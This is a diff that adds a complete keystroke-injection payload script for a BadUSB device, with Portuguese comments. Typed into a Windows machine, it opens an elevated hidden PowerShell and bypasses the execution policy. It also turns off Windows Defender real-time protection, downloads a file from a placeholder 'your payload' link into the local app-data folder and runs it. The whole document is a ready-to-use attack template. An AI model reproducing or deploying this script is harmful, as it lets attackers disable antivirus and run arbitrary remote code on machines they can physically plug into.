@@ -1,0 +1,21 @@
+REM let the HID enumerate
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell.exe
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 3000
+STRING set-executionpolicy unrestricted
+ENTER
+DELAY 2000
+REM  *** Realiza o Download do .ps1 e Executa o .ps1 ***
+STRING (new-object System.Net.WebClient).DownloadFile("Link com seu payload", "$($env:LOCALAPPDATA)\nome_arquivo_exe"); powershell "$($env:LOCALAPPDATA)\nome_arquivo_exe";
+ENTER
